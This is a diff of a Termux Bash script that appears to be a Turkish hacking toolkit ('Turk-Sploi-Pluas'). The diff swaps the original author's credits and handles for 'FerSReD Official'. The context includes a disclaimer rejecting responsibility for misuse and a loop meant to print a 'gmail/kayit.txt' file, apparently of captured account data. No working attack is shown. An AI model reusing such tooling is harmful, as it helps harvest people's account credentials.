@@ -1,8 +1,8 @@
 #!/data/data/com.termux/bin/bash
 #!/bin/bash
-#Code : Yaman Efkar
-#Youtube : YamanEfkar
-#İnstagram : @turksibertimi
+#Code : FerSReD Official                                               
+#Youtube : FerSReD Official
+#İnstagram : @fersred.official
 #Bu toolun kullanımında meydana gelicek hiç bir şey sorumluluğumda değildir!Kişi yaptığı tüm işlerden kendisi sorumludur!
 #Turk-Sploi-Pluas
 banner_game(){
@@ -47,13 +47,13 @@ read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_page
 
 don () {
 while [ false ]; do
-if [[ 'yaman' == 'efkar' ]]; then
+if [[ 'fersred' == 'official' ]]; then
 cat  gmail/kayit.txt
 fi
 sleep 1
 done
 }
-random="yaman"$RANDOM
+random="fersred"$RANDOM
 
 banner_game
 
